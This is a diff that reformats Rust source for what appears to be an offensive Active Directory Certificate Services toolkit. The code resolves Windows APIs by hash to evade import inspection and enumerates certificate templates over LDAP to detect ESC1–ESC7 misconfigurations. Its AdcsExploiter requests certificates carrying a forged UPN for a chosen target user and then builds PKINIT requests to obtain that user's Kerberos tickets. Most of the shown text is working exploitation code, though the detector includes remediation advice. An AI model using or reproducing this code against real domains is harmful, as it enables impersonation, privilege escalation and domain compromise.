@@ -41,13 +41,13 @@ use std::ptr;
 use std::time::UNIX_EPOCH;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
-use crate::win_types::GUID;
 use crate::win_types::DWORD;
-use crate::win_types::{HRESULT, LPCWSTR, LPWSTR};
+use crate::win_types::GUID;
 use crate::win_types::S_OK;
+use crate::win_types::{HRESULT, LPCWSTR, LPWSTR};
 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
@@ -55,9 +55,8 @@ use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // wldap32.dll — LDAP client
 const WLDAP32_DLL_W: &[u16] = &[
-    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
-    'l' as u16, 0,
+    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16, '2' as u16, '.' as u16,
+    'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_WLDAP32_DLL: u32 = hash_wstr_const(WLDAP32_DLL_W);
 
@@ -75,9 +74,8 @@ const FN_LDAP_MSGFREE: u32 = hash_str_const(b"ldap_msgfree");
 
 // netapi32.dll — DC discovery
 const NETAPI32_DLL_W: &[u16] = &[
-    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16,
-    'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16,
-    'l' as u16, 'l' as u16, 0,
+    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_NETAPI32_DLL: u32 = hash_wstr_const(NETAPI32_DLL_W);
 
@@ -230,13 +228,9 @@ impl CertTemplate {
     /// Returns true if the template enables Client Authentication.
     pub fn has_client_auth_eku(&self) -> bool {
         self.extended_key_usage.iter().any(|e| {
-            e == OID_CLIENT_AUTH
-                || e == OID_SMARTCARD_LOGON
-                || e == OID_PKINIT_CLIENT_AUTH
+            e == OID_CLIENT_AUTH || e == OID_SMARTCARD_LOGON || e == OID_PKINIT_CLIENT_AUTH
         }) || self.application_policies.iter().any(|e| {
-            e == OID_CLIENT_AUTH
-                || e == OID_SMARTCARD_LOGON
-                || e == OID_PKINIT_CLIENT_AUTH
+            e == OID_CLIENT_AUTH || e == OID_SMARTCARD_LOGON || e == OID_PKINIT_CLIENT_AUTH
         })
     }
 
@@ -251,7 +245,8 @@ impl CertTemplate {
         self.extended_key_usage
             .iter()
             .any(|e| e == OID_CERT_REQUEST_AGENT)
-            || self.application_policies
+            || self
+                .application_policies
                 .iter()
                 .any(|e| e == OID_CERT_REQUEST_AGENT)
     }
@@ -435,8 +430,7 @@ fn der_context_explicit(tag_num: u8, content: &[u8]) -> Vec<u8> {
 fn build_san_with_upn(upn: &str) -> Vec<u8> {
     // OID 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME) DER-encoded
     let oid_upn: &[u8] = &[
-        0x06, 0x0a,
-        0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03,
+        0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03,
     ];
 
     // UTF8String for the UPN
@@ -478,15 +472,32 @@ fn epoch_days_to_ymd(mut days: i64) -> (i64, i64, i64) {
     let mut year = 1970_i64;
     loop {
         let yd = if is_leap(year) { 366 } else { 365 };
-        if days < yd { break; }
+        if days < yd {
+            break;
+        }
         days -= yd;
         year += 1;
     }
     let leap = is_leap(year);
-    let month_lengths = [31_i64, if leap { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+    let month_lengths = [
+        31_i64,
+        if leap { 29 } else { 28 },
+        31,
+        30,
+        31,
+        30,
+        31,
+        31,
+        30,
+        31,
+        30,
+        31,
+    ];
     let mut month = 1_i64;
     for &ml in &month_lengths {
-        if days < ml { break; }
+        if days < ml {
+            break;
+        }
         days -= ml;
         month += 1;
     }
@@ -505,7 +516,11 @@ fn discover_dc() -> Result<String> {
         .ok_or_else(|| anyhow!("netapi32.dll not found"))?;
 
     let ds_get_dc_name_w: unsafe fn(
-        LPCWSTR, LPCWSTR, *mut GUID, LPCWSTR, DWORD,
+        LPCWSTR,
+        LPCWSTR,
+        *mut GUID,
+        LPCWSTR,
+        DWORD,
         *mut *mut DomainControllerInfoW,
     ) -> HRESULT = unsafe {
         mem::transmute(
@@ -524,7 +539,12 @@ fn discover_dc() -> Result<String> {
     let mut dc_info: *mut DomainControllerInfoW = ptr::null_mut();
     let hr = unsafe {
         ds_get_dc_name_w(
-            ptr::null(), ptr::null(), ptr::null_mut(), ptr::null(), 0, &mut dc_info,
+            ptr::null(),
+            ptr::null(),
+            ptr::null_mut(),
+            ptr::null(),
+            0,
+            &mut dc_info,
         )
     };
 
@@ -578,9 +598,8 @@ impl LdapConn {
             bail!("ldap_initW failed for {}", dc);
         }
 
-        let res = unsafe {
-            ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE)
-        };
+        let res =
+            unsafe { ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
         if res != 0 {
             bail!("ldap_bind_sW failed: error 0x{:08X}", res);
         }
@@ -618,10 +637,13 @@ impl LdapConn {
         attribute: &str,
     ) -> Result<String> {
         let results = self.search_string_attr(base_dn, scope, filter, attribute)?;
-        results
-            .into_iter()
-            .next()
-            .ok_or_else(|| anyhow!("Attribute '{}' not found for filter '{}'", attribute, filter))
+        results.into_iter().next().ok_or_else(|| {
+            anyhow!(
+                "Attribute '{}' not found for filter '{}'",
+                attribute,
+                filter
+            )
+        })
     }
 
     /// Search for all values of a string attribute, returning Vec<String>.
@@ -636,7 +658,13 @@ impl LdapConn {
             .ok_or_else(|| anyhow!("wldap32.dll not found"))?;
 
         let ldap_search_s_w: unsafe fn(
-            PLDAP, LPWSTR, DWORD, LPWSTR, *mut LPWSTR, DWORD, *mut PLDAPMSG,
+            PLDAP,
+            LPWSTR,
+            DWORD,
+            LPWSTR,
+            *mut LPWSTR,
+            DWORD,
+            *mut PLDAPMSG,
         ) -> DWORD = unsafe {
             mem::transmute(
                 pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
@@ -730,7 +758,13 @@ impl LdapConn {
             .ok_or_else(|| anyhow!("wldap32.dll not found"))?;
 
         let ldap_search_s_w: unsafe fn(
-            PLDAP, LPWSTR, DWORD, LPWSTR, *mut LPWSTR, DWORD, *mut PLDAPMSG,
+            PLDAP,
+            LPWSTR,
+            DWORD,
+            LPWSTR,
+            *mut LPWSTR,
+            DWORD,
+            *mut PLDAPMSG,
         ) -> DWORD = unsafe {
             mem::transmute(
                 pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
@@ -743,13 +777,12 @@ impl LdapConn {
                     .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
             )
         };
-        let ldap_get_values_len_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut *mut LdapBerVal =
-            unsafe {
-                mem::transmute(
-                    pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES_LEN)
-                        .ok_or_else(|| anyhow!("ldap_get_values_lenW not found"))?,
-                )
-            };
+        let ldap_get_values_len_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut *mut LdapBerVal = unsafe {
+            mem::transmute(
+                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES_LEN)
+                    .ok_or_else(|| anyhow!("ldap_get_values_lenW not found"))?,
+            )
+        };
         let ldap_value_free_len: unsafe fn(*mut *mut LdapBerVal) -> DWORD = unsafe {
             mem::transmute(
                 pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE_LEN)
@@ -826,7 +859,13 @@ impl LdapConn {
             .ok_or_else(|| anyhow!("wldap32.dll not found"))?;
 
         let ldap_search_s_w: unsafe fn(
-            PLDAP, LPWSTR, DWORD, LPWSTR, *mut LPWSTR, DWORD, *mut PLDAPMSG,
+            PLDAP,
+            LPWSTR,
+            DWORD,
+            LPWSTR,
+            *mut LPWSTR,
+            DWORD,
+            *mut PLDAPMSG,
         ) -> DWORD = unsafe {
             mem::transmute(
                 pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
@@ -857,13 +896,12 @@ impl LdapConn {
                     .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
             )
         };
-        let ldap_get_values_len_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut *mut LdapBerVal =
-            unsafe {
-                mem::transmute(
-                    pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES_LEN)
-                        .ok_or_else(|| anyhow!("ldap_get_values_lenW not found"))?,
-                )
-            };
+        let ldap_get_values_len_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut *mut LdapBerVal = unsafe {
+            mem::transmute(
+                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES_LEN)
+                    .ok_or_else(|| anyhow!("ldap_get_values_lenW not found"))?,
+            )
+        };
         let ldap_value_free_len: unsafe fn(*mut *mut LdapBerVal) -> DWORD = unsafe {
             mem::transmute(
                 pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE_LEN)
@@ -878,16 +916,10 @@ impl LdapConn {
         };
 
         // Build attribute list
-        let mut attr_wide: Vec<Vec<u16>> = attributes
-            .iter()
-            .map(|a| str_to_wide(a))
-            .collect();
+        let mut attr_wide: Vec<Vec<u16>> = attributes.iter().map(|a| str_to_wide(a)).collect();
         // Include distinguishedName always
         attr_wide.push(str_to_wide("distinguishedName"));
-        let mut attr_ptrs: Vec<LPWSTR> = attr_wide
-            .iter()
-            .map(|v| v.as_ptr() as LPWSTR)
-            .collect();
+        let mut attr_ptrs: Vec<LPWSTR> = attr_wide.iter().map(|v| v.as_ptr() as LPWSTR).collect();
         attr_ptrs.push(ptr::null_mut());
 
         let base_w = str_to_wide(base_dn);
@@ -907,7 +939,10 @@ impl LdapConn {
         };
 
         if res != 0 {
-            debug!("[ADCS] LDAP search '{}' under '{}' failed: 0x{:x}", filter, base_dn, res);
+            debug!(
+                "[ADCS] LDAP search '{}' under '{}' failed: 0x{:x}",
+                filter, base_dn, res
+            );
             return Ok(Vec::new());
         }
 
@@ -917,9 +952,8 @@ impl LdapConn {
         while !entry.is_null() {
             // Get DN
             let dn_wide = str_to_wide("distinguishedName");
-            let dn_values = unsafe {
-                ldap_get_values_w(self.ld, entry, dn_wide.as_ptr() as LPWSTR)
-            };
+            let dn_values =
+                unsafe { ldap_get_values_w(self.ld, entry, dn_wide.as_ptr() as LPWSTR) };
             let dn = if !dn_values.is_null() {
                 let s = unsafe {
                     let vp = *dn_values;
@@ -948,16 +982,17 @@ impl LdapConn {
                 let attr_w = str_to_wide(attr_name);
 
                 // Try string values first
-                let str_vals = unsafe {
-                    ldap_get_values_w(self.ld, entry, attr_w.as_ptr() as LPWSTR)
-                };
+                let str_vals =
+                    unsafe { ldap_get_values_w(self.ld, entry, attr_w.as_ptr() as LPWSTR) };
                 if !str_vals.is_null() {
                     let mut vals = Vec::new();
                     unsafe {
                         let mut i = 0;
                         loop {
                             let vp = *str_vals.add(i);
-                            if vp.is_null() { break; }
+                            if vp.is_null() {
+                                break;
+                            }
                             let len = lstrlen_w(vp);
                             if let Ok(s) = wide_to_str(&std::slice::from_raw_parts(vp, len + 1)) {
                                 vals.push(s);
@@ -974,16 +1009,15 @@ impl LdapConn {
                         // We need to break out of inner attr loop and continue
                         // Actually, let's just store and continue the attr loop
                         let _ = entry; // suppress unused warning
-                        // Restore entry for the attribute loop continuation
-                        // (ldap_next_entry is only called after all attrs are read)
+                                       // Restore entry for the attribute loop continuation
+                                       // (ldap_next_entry is only called after all attrs are read)
                     }
                     continue;
                 }
 
                 // Try binary values for attributes that may be binary
-                let bin_vals = unsafe {
-                    ldap_get_values_len_w(self.ld, entry, attr_w.as_ptr() as LPWSTR)
-                };
+                let bin_vals =
+                    unsafe { ldap_get_values_len_w(self.ld, entry, attr_w.as_ptr() as LPWSTR) };
                 if !bin_vals.is_null() {
                     let bytes = unsafe {
                         let bvp = *bin_vals;
@@ -1014,11 +1048,12 @@ impl LdapConn {
 impl Drop for LdapConn {
     fn drop(&mut self) {
         if !self.ld.is_null() {
-            if let Some(wldap32) = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) } {
+            if let Some(wldap32) =
+                unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
+            {
                 let ldap_unbind: unsafe fn(PLDAP) -> DWORD = unsafe {
                     mem::transmute(
-                        pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_UNBIND)
-                            .unwrap_or(0),
+                        pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_UNBIND).unwrap_or(0),
                     )
                 };
                 if ldap_unbind as usize != 0 {
@@ -1038,24 +1073,25 @@ struct LdapEntry {
 
 impl LdapEntry {
     fn str_val(&self, attr: &str) -> Option<&str> {
-        self.str_attrs.get(attr).and_then(|v| v.first()).map(|s| s.as_str())
+        self.str_attrs
+            .get(attr)
+            .and_then(|v| v.first())
+            .map(|s| s.as_str())
     }
 
     fn str_vals(&self, attr: &str) -> Vec<String> {
-        self.str_attrs
-            .get(attr)
-            .cloned()
-            .unwrap_or_default()
+        self.str_attrs.get(attr).cloned().unwrap_or_default()
     }
 
     fn bin_val(&self, attr: &str) -> &[u8] {
-        self.bin_attrs.get(attr).map(|v| v.as_slice()).unwrap_or(&[])
+        self.bin_attrs
+            .get(attr)
+            .map(|v| v.as_slice())
+            .unwrap_or(&[])
     }
 
     fn parse_u32(&self, attr: &str) -> u32 {
-        self.str_val(attr)
-            .and_then(|s| s.parse().ok())
-            .unwrap_or(0)
+        self.str_val(attr).and_then(|s| s.parse().ok()).unwrap_or(0)
     }
 }
 
@@ -1167,20 +1203,13 @@ impl AdcsEnumerator {
             "nTSecurityDescriptor",
         ];
 
-        let entries = ldap.search_all(
-            &tmpl_base,
-            "(objectClass=pKICertificateTemplate)",
-            attrs,
-        )?;
+        let entries = ldap.search_all(&tmpl_base, "(objectClass=pKICertificateTemplate)", attrs)?;
         info!("[ADCS] Found {} certificate templates", entries.len());
 
         let mut templates = Vec::new();
         for entry in &entries {
             let name = entry.str_val("cn").unwrap_or("unknown").to_string();
-            let display_name = entry
-                .str_val("displayName")
-                .unwrap_or(&name)
-                .to_string();
+            let display_name = entry.str_val("displayName").unwrap_or(&name).to_string();
 
             let name_flags = entry.parse_u32("msPKI-Certificate-Name-Flag");
             let enrollment_flags = entry.parse_u32("msPKI-Enrollment-Flag");
@@ -1188,10 +1217,8 @@ impl AdcsEnumerator {
             let schema_version = entry.parse_u32("msPKI-Template-Schema-Version");
 
             let extended_key_usage = entry.str_vals("pKIExtendedKeyUsage");
-            let application_policies =
-                entry.str_vals("msPKI-Certificate-Application-Policy");
-            let ra_application_policies =
-                entry.str_vals("msPKI-RA-Application-Policies");
+            let application_policies = entry.str_vals("msPKI-Certificate-Application-Policy");
+            let ra_application_policies = entry.str_vals("msPKI-RA-Application-Policies");
 
             let security_descriptor = entry.bin_val("nTSecurityDescriptor").to_vec();
 
@@ -1288,10 +1315,12 @@ impl AdcsVulnDetector {
                         t.name
                     ),
                     prerequisites: "Enroll permission on this template (often granted \
-                        to Domain Users or Authenticated Users by default).".into(),
+                        to Domain Users or Authenticated Users by default)."
+                        .into(),
                     remediation: "Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from \
                         msPKI-Certificate-Name-Flag, or enable CT_FLAG_PEND_ALL_REQUESTS \
-                        to require CA manager approval for all requests.".into(),
+                        to require CA manager approval for all requests."
+                        .into(),
                 });
             }
         }
@@ -1324,7 +1353,8 @@ impl AdcsVulnDetector {
                     ),
                     prerequisites: "Enroll permission on this template.".into(),
                     remediation: "Explicitly set the Extended Key Usage to only the \
-                        required purposes (e.g. TLS Client Authentication).".into(),
+                        required purposes (e.g. TLS Client Authentication)."
+                        .into(),
                 });
             }
         }
@@ -1361,7 +1391,8 @@ impl AdcsVulnDetector {
                         template that accepts on-behalf-of enrollment with client auth EKU."
                         .into(),
                     remediation: "Remove the Certificate Request Agent EKU, or restrict \
-                        enrollment to a dedicated service account.".into(),
+                        enrollment to a dedicated service account."
+                        .into(),
                 });
             }
         }
@@ -1397,9 +1428,11 @@ impl AdcsVulnDetector {
                         t.name
                     ),
                     prerequisites: "Any domain-authenticated user (Domain Users or \
-                        Authenticated Users).".into(),
+                        Authenticated Users)."
+                        .into(),
                     remediation: "Remove WriteProperty and GenericWrite permissions from \
-                        non-admin principals in the template's DACL.".into(),
+                        non-admin principals in the template's DACL."
+                        .into(),
                 });
             }
         }
@@ -1436,7 +1469,9 @@ impl AdcsVulnDetector {
             .collect();
 
         for ca in cas {
-            if ca.edit_flags & EDITF_ATTRIBUTESUBJECTALTNAME2 != 0 && !exploitable_templates.is_empty() {
+            if ca.edit_flags & EDITF_ATTRIBUTESUBJECTALTNAME2 != 0
+                && !exploitable_templates.is_empty()
+            {
                 out.push(VulnerableCA {
                     ca: ca.clone(),
                     esc_type: EscType::Esc6,
@@ -1494,7 +1529,8 @@ impl AdcsVulnDetector {
                     ),
                     remediation: "In Certification Authority MMC → right-click CA → \
                         Properties → Security. Remove ManageCA/ManageCertificates from \
-                        non-admin accounts.".into(),
+                        non-admin accounts."
+                        .into(),
                 });
             }
         }
@@ -1543,7 +1579,9 @@ fn probe_http_enrollment(url: &str) -> Result<bool> {
 
     let timeout = std::time::Duration::from_secs(5);
     let mut stream = match TcpStream::connect_timeout(
-        &addr.parse().with_context(|| format!("Invalid address: {}", addr))?,
+        &addr
+            .parse()
+            .with_context(|| format!("Invalid address: {}", addr))?,
         timeout,
     ) {
         Ok(s) => s,
@@ -1599,9 +1637,8 @@ fn dacl_has_low_priv_write(sd_bytes: &[u8]) -> bool {
         return false;
     }
 
-    let dacl_offset = u32::from_le_bytes([
-        sd_bytes[16], sd_bytes[17], sd_bytes[18], sd_bytes[19],
-    ]) as usize;
+    let dacl_offset =
+        u32::from_le_bytes([sd_bytes[16], sd_bytes[17], sd_bytes[18], sd_bytes[19]]) as usize;
 
     if dacl_offset == 0 || dacl_offset + 8 > sd_bytes.len() {
         return false;
@@ -1609,10 +1646,8 @@ fn dacl_has_low_priv_write(sd_bytes: &[u8]) -> bool {
 
     // ACL header (at dacl_offset):
     //   AclRevision u8, Sbz1 u8, AclSize u16, AceCount u16, Sbz2 u16
-    let ace_count = u16::from_le_bytes([
-        sd_bytes[dacl_offset + 4],
-        sd_bytes[dacl_offset + 5],
-    ]) as usize;
+    let ace_count =
+        u16::from_le_bytes([sd_bytes[dacl_offset + 4], sd_bytes[dacl_offset + 5]]) as usize;
 
     let mut ace_ptr = dacl_offset + 8;
 
@@ -1671,9 +1706,8 @@ fn is_low_priv_sid(data: &[u8]) -> bool {
     }
 
     // Authority is the 6-byte big-endian field at bytes 2..8
-    let authority = u64::from_be_bytes([
-        0, 0, data[2], data[3], data[4], data[5], data[6], data[7],
-    ]);
+    let authority =
+        u64::from_be_bytes([0, 0, data[2], data[3], data[4], data[5], data[6], data[7]]);
 
     // S-1-1-0 (Everyone): authority=1, sub_count=1, sub[0]=0
     if authority == 1 && sub_count == 1 {
@@ -1737,8 +1771,8 @@ impl CertRequestRpc {
         use rcgen::{CertificateParams, CustomExtension, DnType, ExtendedKeyUsagePurpose, KeyPair};
 
         // ── Generate key pair in memory ──────────────────────────────────
-        let key_pair = KeyPair::generate()
-            .map_err(|e| anyhow!("Failed to generate key pair: {}", e))?;
+        let key_pair =
+            KeyPair::generate().map_err(|e| anyhow!("Failed to generate key pair: {}", e))?;
 
         // ── Build CSR parameters ─────────────────────────────────────────
         let mut params = CertificateParams::new(vec![])
@@ -1781,8 +1815,10 @@ impl CertRequestRpc {
         let submit_result = std::process::Command::new("certreq.exe")
             .args(&[
                 "-submit",
-                "-config", &config,
-                "-attrib", &attrib,
+                "-config",
+                &config,
+                "-attrib",
+                &attrib,
                 csr_path.to_str().unwrap_or(""),
                 cert_path.to_str().unwrap_or(""),
             ])
@@ -1791,8 +1827,7 @@ impl CertRequestRpc {
         // Clean up CSR file regardless of submission result
         let _ = std::fs::remove_file(&csr_path);
 
-        let output = submit_result
-            .with_context(|| "Failed to execute certreq.exe")?;
+        let output = submit_result.with_context(|| "Failed to execute certreq.exe")?;
 
         if !output.status.success() {
             let _ = std::fs::remove_file(&cert_path);
@@ -1877,11 +1912,7 @@ impl AdcsExploiter {
             target_user.to_string()
         } else {
             // Derive domain from the CA's DNS name (heuristic)
-            let domain = ca.dns_name
-                .split('.')
-                .skip(1)
-                .collect::<Vec<_>>()
-                .join(".");
+            let domain = ca.dns_name.split('.').skip(1).collect::<Vec<_>>().join(".");
             if domain.is_empty() {
                 target_user.to_string()
             } else {
@@ -1889,7 +1920,10 @@ impl AdcsExploiter {
             }
         };
 
-        let subject = format!("CN={}", target_user.split('@').next().unwrap_or(target_user));
+        let subject = format!(
+            "CN={}",
+            target_user.split('@').next().unwrap_or(target_user)
+        );
 
         CertRequestRpc::request_cert(
             &ca.dns_name,
@@ -1950,11 +1984,7 @@ impl AdcsExploiter {
         let upn = if target_user.contains('@') {
             target_user.to_string()
         } else {
-            let domain = ca.dns_name
-                .split('.')
-                .skip(1)
-                .collect::<Vec<_>>()
-                .join(".");
+            let domain = ca.dns_name.split('.').skip(1).collect::<Vec<_>>().join(".");
             format!("{}@{}", target_user, domain)
         };
 
@@ -1968,7 +1998,10 @@ impl AdcsExploiter {
              requires agent cert to be installed.  Attempting via template attributes."
         );
 
-        let target_subject = format!("CN={}", target_user.split('@').next().unwrap_or(target_user));
+        let target_subject = format!(
+            "CN={}",
+            target_user.split('@').next().unwrap_or(target_user)
+        );
         CertRequestRpc::request_cert(
             &ca.dns_name,
             &ca.name,
@@ -1999,15 +2032,14 @@ impl AdcsExploiter {
         let upn = if target_user.contains('@') {
             target_user.to_string()
         } else {
-            let domain = ca.dns_name
-                .split('.')
-                .skip(1)
-                .collect::<Vec<_>>()
-                .join(".");
+            let domain = ca.dns_name.split('.').skip(1).collect::<Vec<_>>().join(".");
             format!("{}@{}", target_user, domain)
         };
 
-        let subject = format!("CN={}", target_user.split('@').next().unwrap_or(target_user));
+        let subject = format!(
+            "CN={}",
+            target_user.split('@').next().unwrap_or(target_user)
+        );
 
         // We use the same CertRequestRpc path which embeds the UPN in the CSR SAN.
         // When EDITF_ATTRIBUTESUBJECTALTNAME2 is set, the CA also honours SAN
@@ -2041,11 +2073,7 @@ impl AdcsExploiter {
 
         let as_rep_bytes = pkinit_authenticate(upn, &pfx.key_der, &pfx.cert_der, dc_hostname)?;
 
-        let realm = upn
-            .split('@')
-            .nth(1)
-            .unwrap_or("UNKNOWN")
-            .to_uppercase();
+        let realm = upn.split('@').nth(1).unwrap_or("UNKNOWN").to_uppercase();
 
         Ok(KerberosTicket {
             as_rep_bytes,
@@ -2112,9 +2140,9 @@ fn build_pkinit_as_req(upn: &str, key_der: &[u8], cert_der: &[u8]) -> Result<Vec
     //   ctime [1] KerberosTime
     //   nonce [2] INTEGER (0..4294967295)
     let pk_auth_inner = [
-        der_context_explicit(0, &der_integer(0)),              // cusec
+        der_context_explicit(0, &der_integer(0)), // cusec
         der_context_explicit(1, &der_general_string(&format_krb_time(now))), // ctime
-        der_context_explicit(2, &der_integer(nonce as i64)),   // nonce
+        der_context_explicit(2, &der_integer(nonce as i64)), // nonce
     ]
     .concat();
     let pk_authenticator = der_sequence(&pk_auth_inner);
@@ -2138,10 +2166,13 @@ fn build_pkinit_as_req(upn: &str, key_der: &[u8], cert_der: &[u8]) -> Result<Vec
     let signed_data = build_signed_data_inner(&auth_pack, cert_der, key_der)?;
 
     // padata SEQUENCE { SEQUENCE { type, value } }
-    let pa_data_entry = der_sequence(&[
-        der_context_explicit(1, &der_integer(16)), // padata-type 16
-        der_context_explicit(2, &der_octet_string(&signed_data)), // padata-value
-    ].concat());
+    let pa_data_entry = der_sequence(
+        &[
+            der_context_explicit(1, &der_integer(16)), // padata-type 16
+            der_context_explicit(2, &der_octet_string(&signed_data)), // padata-value
+        ]
+        .concat(),
+    );
     let pa_data_seq = der_sequence(&pa_data_entry);
 
     // ── KDC-REQ-BODY ────────────────────────────────────────────────────
@@ -2151,8 +2182,7 @@ fn build_pkinit_as_req(upn: &str, key_der: &[u8], cert_der: &[u8]) -> Result<Vec
         der_context_explicit(1, &der_sequence(&der_general_string(username))),
     ]
     .concat();
-    let sname_names =
-        [der_general_string("krbtgt"), der_general_string(realm)].concat();
+    let sname_names = [der_general_string("krbtgt"), der_general_string(realm)].concat();
     let sname_inner = [
         der_context_explicit(0, &der_integer(2)), // NT-SRV-INST
         der_context_explicit(1, &der_sequence(&sname_names)),
@@ -2174,9 +2204,9 @@ fn build_pkinit_as_req(upn: &str, key_der: &[u8], cert_der: &[u8]) -> Result<Vec
     // ── Full AS-REQ ──────────────────────────────────────────────────────
     // AS-REQ is APPLICATION 10 (0x6a)
     let as_req_inner = [
-        der_context_explicit(1, &der_integer(5)),   // pvno
-        der_context_explicit(2, &der_integer(10)),  // msg-type AS-REQ
-        der_context_explicit(3, &pa_data_seq),      // padata
+        der_context_explicit(1, &der_integer(5)),  // pvno
+        der_context_explicit(2, &der_integer(10)), // msg-type AS-REQ
+        der_context_explicit(3, &pa_data_seq),     // padata
         req_body,
     ]
     .concat();
@@ -2210,15 +2240,23 @@ fn build_minimal_signed_data(content: &[u8], cert_der: &[u8]) -> Result<Vec<u8>>
 
 /// Parse a little-endian length at `data[offset..]`, returning `(len, bytes_consumed)`.
 fn read_der_len_at(data: &[u8], offset: usize) -> Result<(usize, usize)> {
-    let b = *data.get(offset).ok_or_else(|| anyhow!("DER: truncated length"))?;
+    let b = *data
+        .get(offset)
+        .ok_or_else(|| anyhow!("DER: truncated length"))?;
     if b < 0x80 {
         Ok((b as usize, 1))
     } else if b == 0x81 {
-        let n = *data.get(offset + 1).ok_or_else(|| anyhow!("DER: truncated 0x81 length"))? as usize;
+        let n = *data
+            .get(offset + 1)
+            .ok_or_else(|| anyhow!("DER: truncated 0x81 length"))? as usize;
         Ok((n, 2))
     } else if b == 0x82 {
-        let hi = *data.get(offset + 1).ok_or_else(|| anyhow!("DER: truncated 0x82 length"))? as usize;
-        let lo = *data.get(offset + 2).ok_or_else(|| anyhow!("DER: truncated 0x82 length b"))? as usize;
+        let hi = *data
+            .get(offset + 1)
+            .ok_or_else(|| anyhow!("DER: truncated 0x82 length"))? as usize;
+        let lo = *data
+            .get(offset + 2)
+            .ok_or_else(|| anyhow!("DER: truncated 0x82 length b"))? as usize;
         Ok(((hi << 8) | lo, 3))
     } else {
         bail!("DER: unsupported length form 0x{:02x}", b)
@@ -2230,7 +2268,8 @@ fn read_der_len_at(data: &[u8], offset: usize) -> Result<(usize, usize)> {
 fn extract_issuer_and_serial_raw(cert_der: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
     // Certificate SEQUENCE
     let (cert_len, cert_lb) = read_der_len_at(cert_der, 1)?;
-    let cert_inner = cert_der.get(1 + cert_lb..1 + cert_lb + cert_len)
+    let cert_inner = cert_der
+        .get(1 + cert_lb..1 + cert_lb + cert_len)
         .ok_or_else(|| anyhow!("cert: truncated outer SEQUENCE"))?;
 
     // TBSCertificate SEQUENCE
@@ -2238,7 +2277,8 @@ fn extract_issuer_and_serial_raw(cert_der: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> 
         bail!("cert: expected TBSCertificate SEQUENCE");
     }
     let (tbs_len, tbs_lb) = read_der_len_at(cert_inner, 1)?;
-    let tbs = cert_inner.get(1 + tbs_lb..1 + tbs_lb + tbs_len)
+    let tbs = cert_inner
+        .get(1 + tbs_lb..1 + tbs_lb + tbs_len)
         .ok_or_else(|| anyhow!("cert: truncated TBSCertificate"))?;
 
     let mut pos = 0;
@@ -2250,7 +2290,10 @@ fn extract_issuer_and_serial_raw(cert_der: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> 
     }
     // serialNumber INTEGER — save raw TLV
     if tbs.get(pos) != Some(&0x02) {
-        bail!("cert: expected INTEGER serialNumber, got 0x{:02x}", tbs.get(pos).copied().unwrap_or(0));
+        bail!(
+            "cert: expected INTEGER serialNumber, got 0x{:02x}",
+            tbs.get(pos).copied().unwrap_or(0)
+        );
     }
     let serial_start = pos;
     pos += 1;
@@ -2268,7 +2311,10 @@ fn extract_issuer_and_serial_raw(cert_der: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> 
 
     // issuer SEQUENCE — save raw TLV
     if tbs.get(pos) != Some(&0x30) {
-        bail!("cert: expected SEQUENCE for issuer, got 0x{:02x}", tbs.get(pos).copied().unwrap_or(0));
+        bail!(
+            "cert: expected SEQUENCE for issuer, got 0x{:02x}",
+            tbs.get(pos).copied().unwrap_or(0)
+        );
     }
     let issuer_start = pos;
     pos += 1;
@@ -2281,7 +2327,11 @@ fn extract_issuer_and_serial_raw(cert_der: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> 
 
 /// Core CMS SignedData builder.  When `key_pkcs8_der` is non-empty, adds a
 /// real ECDSA-P256-SHA256 SignerInfo; otherwise produces an empty signerInfos.
